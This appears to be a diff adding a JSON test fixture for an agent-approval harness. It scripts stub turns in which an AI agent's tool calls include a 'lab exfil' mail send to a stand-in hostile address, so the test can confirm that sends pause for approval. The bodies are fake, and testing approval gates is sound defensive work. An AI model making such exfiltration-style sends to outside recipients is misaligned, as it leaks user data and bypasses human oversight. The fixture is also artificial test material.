@@ -1,0 +1,45 @@
+{
+  "id": "p4-mcp-appr-002-hostile",
+  "description": "Fake data only. Leg 2 of APPR-002, same conversation as leg 1. One turn asks for three calls: the always-allowed lab_echo (must run with no pause), the Nextcloud mail send and the lab exfil mail send (each must pause for its own approval). Padded text turns follow because the stub counts tool messages to choose a turn.",
+  "turns": [
+    {
+      "content": "Continuing."
+    },
+    {
+      "tool_calls": [
+        {
+          "name": "lab_echo_mcp_lab",
+          "arguments": {
+            "text": "p4l3 appr-002 echo again"
+          }
+        },
+        {
+          "name": "nc_mail_send_message_mcp_nextcloud",
+          "arguments": {
+            "account_id": "{{bind:OWNER_ACCOUNT_ID}}",
+            "to": [
+              {
+                "email": "p4l3-appr-002-hostile@p4.test"
+              }
+            ],
+            "subject": "p4l3 appr-002 nextcloud send",
+            "body": "p4l3 fake body, no secret"
+          }
+        },
+        {
+          "name": "lab_mail_send_mcp_lab",
+          "arguments": {
+            "to": "p4l3-appr-002-hostile@p4.test",
+            "subject": "p4l3 appr-002 lab exfil",
+            "body": "p4l3 fake body, no secret"
+          }
+        }
+      ]
+    },
+    { "content": "Stopped." },
+    { "content": "Stopped." },
+    { "content": "Stopped." },
+    { "content": "Stopped." },
+    { "content": "Stopped." }
+  ]
+}
